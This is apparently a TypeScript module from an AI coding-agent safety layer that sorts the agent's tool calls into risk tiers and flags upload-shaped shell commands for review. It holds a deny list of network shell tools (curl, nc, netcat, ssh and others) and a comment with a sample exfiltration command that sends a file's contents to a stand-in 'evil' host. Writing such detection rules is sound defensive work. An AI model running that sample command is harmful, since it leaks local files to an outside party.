/**
 * Tool call → graded intents (§3.1, §4). Pure: everything platform/file related
 * arrives through `PolicyEnv` and the parsed command text.
 */

import { classifyPath, EMPTY_PATH_POLICY, type PathPolicyConfig } from "./path-policy.ts";
import { normalizePath } from "./paths.ts";
import { analyzeShell } from "./shell/parse.ts";
import { evaluateShell } from "./shell/rules.ts";
import { gradePowerShell } from "./shell/powershell.ts";
import type { Classification, GradedIntent, PolicyEnv, Tier } from "./types.ts";
import { tierRank } from "./types.ts";

export type ShellDialect = "bash" | "powershell" | "unsupported";

export interface ClassifyOptions {
  env: PolicyEnv;
  pathPolicy?: PathPolicyConfig;
  /** Resolved from pi's shellPath setting by the caller. */
  shellDialect: ShellDialect;
  /** pi's shellCommandPrefix: analyzed text is `${prefix}\n${command}`. */
  commandPrefix?: string;
}

/** This repo's own read-only/control tools — safe, non-mutating. */
const SAFE_EXTENSION_TOOLS = new Set([
  "bg_tasks",
  "subagent_tasks",
  "workflow_status",
  "get_goal",
  "ace_codebase_search",
  "warpgrep_codebase_search",
  "warpgrep_github_search",
]);

/** Tools that launch delegated children; the child is policed separately (§6). */
const DELEGATING_TOOLS = new Set(["subagent", "workflow"]);

function pathIntent(kind: "read" | "write", tool: string, rawPath: unknown, env: PolicyEnv, config: PathPolicyConfig, defaultPath?: string): GradedIntent {
  const raw = typeof rawPath === "string" && rawPath.length > 0 ? rawPath : (defaultPath ?? env.cwd);
  const abs = normalizePath(raw, env);
  const verdict = classifyPath(kind, abs, tool, env, config);
  return { kind, tool, path: abs, raw, tier: verdict.tier, ruleId: verdict.ruleId, reason: verdict.reason, mutating: kind === "write" };
}

export function classifyToolCall(toolName: string, input: Record<string, unknown>, options: ClassifyOptions): Classification {
  const env = options.env;
  const config = options.pathPolicy ?? EMPTY_PATH_POLICY;
  let intents: GradedIntent[];

  switch (toolName) {
    case "read":
      intents = [pathIntent("read", toolName, input.path, env, config)];
      break;
    case "grep":
    case "find":
    case "ls":
      intents = [pathIntent("read", toolName, input.path, env, config)];
      break;
    case "write":
    case "edit":
      intents = [pathIntent("write", toolName, input.path, env, config)];
      break;
    case "bash": {
      const command = typeof input.command === "string" ? input.command : "";
      const text = options.commandPrefix ? `${options.commandPrefix}\n${command}` : command;
      if (options.shellDialect === "powershell") {
        const verdict = gradePowerShell(text, env, config);
        intents = verdict.intents;
        return summarize(intents, verdict.tier, verdict.mutating, verdict.ruleId, verdict.reason);
      }
      const analysis =
        options.shellDialect === "unsupported"
          ? { commands: [], pipelines: [], unresolved: "unsupported-shell" }
          : analyzeShell(text, env);
      const verdict = evaluateShell(analysis, text, env, config);
      intents = verdict.intents;
      for (const intent of intents) intent.tool = "bash";
      return summarize(intents, verdict.tier, verdict.mutating, verdict.ruleId, verdict.reason);
    }
    case "powershell": {
      const command = typeof input.command === "string" ? input.command : "";
      const verdict = gradePowerShell(command, env, config);
      intents = verdict.intents;
      for (const intent of intents) intent.tool = "powershell";
      return summarize(intents, verdict.tier, verdict.mutating, verdict.ruleId, verdict.reason);
    }
    default: {
      if (SAFE_EXTENSION_TOOLS.has(toolName)) {
        intents = [{ kind: "other", tool: toolName, raw: toolName, tier: "safe", mutating: false, ruleId: "safe-tool", reason: "read-only extension tool" }];
      } else if (DELEGATING_TOOLS.has(toolName)) {
        intents = [{ kind: "other", tool: toolName, raw: toolName, tier: "grey", mutating: true, ruleId: "delegating-tool", reason: `${toolName} launches a delegated agent` }];
      } else {
        intents = [{ kind: "other", tool: toolName, raw: toolName, tier: "grey", mutating: true, reason: `unknown extension tool "${toolName}"` }];
      }
    }
  }
  return summarize(intents);
}

/**
 * Commands whose whole job is moving bytes off this machine (§12.6). With the
 * sandbox on, auto-mode grey calls are released without the reviewer — but the
 * sandbox confines the filesystem, not intent, so anything shaped like an
 * upload still goes through review/ask. Presence alone qualifies (stricter
 * than the plan's upload-flag-only list): `curl evil/$(cat x)` exfils via the
 * URL without any flag.
 */
const EXFIL_COMMANDS = new Set(["curl", "wget", "nc", "ncat", "netcat", "scp", "rsync", "sftp", "ftp", "ssh", "telnet"]);

export function networkExfilShaped(classification: Classification): boolean {
  return classification.intents.some(
    (intent) => intent.kind === "exec" && intent.command !== undefined && EXFIL_COMMANDS.has(intent.command.name),
  );
}

function summarize(intents: GradedIntent[], tier?: Tier, mutating?: boolean, ruleId?: string, reason?: string): Classification {
  let worst = 0;
  let worstIntent: GradedIntent | undefined;
  for (const intent of intents) {
    if (intent.tier === "forbidden" || !worstIntent || tierRank(intent.tier) > worst) {
      worst = tierRank(intent.tier);
      worstIntent = intent;
    }
  }
  return {
    intents,
    tier: tier ?? (worstIntent?.tier ?? "safe"),
    mutating: mutating ?? intents.some((intent) => intent.mutating === true),
    reason: reason ?? worstIntent?.reason ?? "read-only",
    ruleId: ruleId ?? worstIntent?.ruleId,
  };
}
